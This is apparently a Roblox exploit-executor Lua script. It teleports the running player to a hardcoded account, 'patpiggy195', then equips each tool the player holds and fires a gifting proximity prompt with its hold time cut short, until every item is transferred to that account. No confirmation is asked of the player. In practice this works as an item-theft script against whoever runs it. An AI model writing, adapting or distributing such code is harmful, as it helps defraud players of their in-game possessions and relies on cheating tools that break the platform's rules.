-- SETTINGS
local targetUsername = "patpiggy195" -- the player to send gifts to

-- SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

-- WAIT FOR PLAYER CHARACTER
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")

-- WAIT FOR TARGET PLAYER
local targetPlayer = Players:FindFirstChild(targetUsername)
while not targetPlayer do
    warn("Waiting for target player:", targetUsername)
    targetPlayer = Players:FindFirstChild(targetUsername)
    task.wait(1)
end

-- WAIT FOR TARGET CHARACTER
local targetCharacter = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
local targetHRP = targetCharacter:WaitForChild("HumanoidRootPart")

-- TELEPORT TO TARGET
if Character and Character:FindFirstChild("HumanoidRootPart") then
    Character:SetPrimaryPartCFrame(targetHRP.CFrame * CFrame.new(0, 0, -2)) -- stand in front
    task.wait(1)
end

-- FUNCTION: TRY TO FIRE PROMPT FOR EQUIPPED TOOL
local function tryGiftTool(tool)
    -- Equip tool
    Humanoid:EquipTool(tool)
    print("Equipped tool:", tool.Name)

    -- Wait for prompt to appear
    local prompt = nil
    for i = 1, 30 do -- wait up to 3 seconds
        prompt = targetHRP:FindFirstChildOfClass("ProximityPrompt")
        if prompt then break end
        task.wait(0.1)
    end

    if prompt then
        print("Firing prompt for:", tool.Name)
        prompt.HoldDuration = 0.1
        fireproximityprompt(prompt)
        task.wait(1.2) -- wait for gifting to finish
    else
        warn("❌ No prompt found for:", tool.Name)
    end
end

-- GET INVENTORY
local Backpack = LocalPlayer:WaitForChild("Backpack")

-- SEND ALL TOOLS FROM BACKPACK
for _, tool in ipairs(Backpack:GetChildren()) do
    if tool:IsA("Tool") then
        tryGiftTool(tool)
    end
end

-- SEND ACTIVE TOOL IF EQUIPPED
local activeTool = Character:FindFirstChildOfClass("Tool")
if activeTool then
    print("Sending equipped tool:", activeTool.Name)
    tryGiftTool(activeTool)
end

print("✅ Done sending items to", targetUsername)
